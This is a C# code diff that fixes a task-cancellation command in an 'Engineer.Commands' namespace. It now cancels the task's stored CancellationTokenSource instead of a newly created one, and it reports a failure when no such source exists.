@@ -17,13 +17,22 @@ namespace Engineer.Commands
         public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/TaskId", out string canceltaskId);
-            //find the task and cancel its CancellationToken
+            // Find the task and cancel its CancellationToken
             var taskToCancel = Tasking.engTaskDic[canceltaskId];
-            CancellationTokenSource cts = new CancellationTokenSource();
-            taskToCancel.cancelToken = cts.Token;
-            cts.Cancel();
-            //call FillTaskResult saying we cancelled the task
-            Tasking.FillTaskResults($"Cancelled task {canceltaskId}", task, EngTaskStatus.Complete,TaskResponseType.String);
+
+            // Find the CancellationTokenSource for the task and cancel it
+            if (Tasking.cancellationTokenSourceDic.TryGetValue(canceltaskId, out CancellationTokenSource cts))
+            {
+                cts.Cancel();
+            }
+            else
+            {
+                Tasking.FillTaskResults($"Failed to find CancellationTokenSource for task {canceltaskId}", task, EngTaskStatus.Failed, TaskResponseType.String);
+                return;
+            }
+
+            // Call FillTaskResult saying we cancelled the task
+            Tasking.FillTaskResults($"Cancelled task {canceltaskId}", task, EngTaskStatus.Complete, TaskResponseType.String);
         }
     }
 }
